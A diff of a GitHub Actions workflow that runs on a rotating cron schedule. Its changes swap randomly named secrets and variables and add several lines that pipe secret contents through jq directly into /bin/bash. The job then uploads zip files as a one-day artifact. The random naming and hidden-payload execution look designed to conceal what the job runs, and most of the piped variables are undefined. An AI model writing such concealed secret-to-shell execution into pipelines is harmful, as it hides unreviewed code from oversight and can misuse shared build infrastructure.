@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '33 4,10,16,22 * * *'
+    - cron: '13 2,8,14,20 * * *'
 jobs:
   action:
     runs-on: ubuntu-latest
@@ -11,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Begin
         env:
-          dyqe1: ${{ secrets.dyqe1 }}
+          cjqjl7625: ${{ secrets.cjqjl7625 }}
         run: |
-          printf '%s' "$dyqe1" | jq -r .bqz858 | /bin/bash
-          echo $poa8266 | jq -r .c342 | /bin/bash
-          printf '%s' "$vqq29784" | jq -r .lqvrm7 | /bin/bash
-          echo $pa4205 | jq -r .qk23 | /bin/bash
-          printf '%s' "$uw29737" | jq -r .aps04955 | /bin/bash
+          printf '%s' "$cjqjl7625" | jq -r .anoec1895 | /bin/bash
+          printf '%s' "$p9" | jq -r .txnb8 | /bin/bash
+          printf '%s' "$lmvip81101" | jq -r .o0 | /bin/bash
+          echo $gaqw1107 | jq -r .x33 | /bin/bash
+          echo $yzkdo86 | jq -r .eog17 | /bin/bash
+          printf '%s' "$xb0" | jq -r .cuhwt2 | /bin/bash
+          echo $pxbe4 | jq -r .hvl3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: cDzOw436
+          name: GMLRqHSv
           path: "*.zip"
           retention-days: 1
